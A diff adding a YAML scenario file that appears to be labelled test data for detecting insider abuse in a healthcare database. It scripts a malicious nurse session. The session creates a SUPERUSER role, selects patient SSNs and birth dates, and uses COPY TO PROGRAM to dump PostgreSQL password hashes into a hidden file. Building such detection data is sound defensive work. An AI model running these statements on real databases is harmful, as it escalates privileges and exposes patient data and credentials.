@@ -1,0 +1,21 @@
+scenario_id: healthcare_priv_abuse_0011
+family_id: healthcare_priv_abuse_0011
+domain: healthcare
+time_of_day: 03:45
+default_class: malicious
+rule_engine_relationship: agrees
+sessions:
+- session_label: escalate_and_dump
+  role: nurse
+  class: malicious
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 0.8588710352003555
+  events:
+  - step_id: escalate
+    sql: CREATE ROLE dba_maint SUPERUSER LOGIN PASSWORD 'H2HkYHxfZr'
+  - sql: SELECT ssn, address, full_name, date_of_birth FROM patients WHERE primary_doctor_id NOT IN (SELECT doctor_id FROM doctors WHERE department_id = 'DEPT-PATH')
+  - step_id: dump
+    sql: COPY (SELECT rolname, rolpassword FROM pg_authid) TO PROGRAM 'cat >> /var/lib/postgresql/.cache/creds_dump.txt'
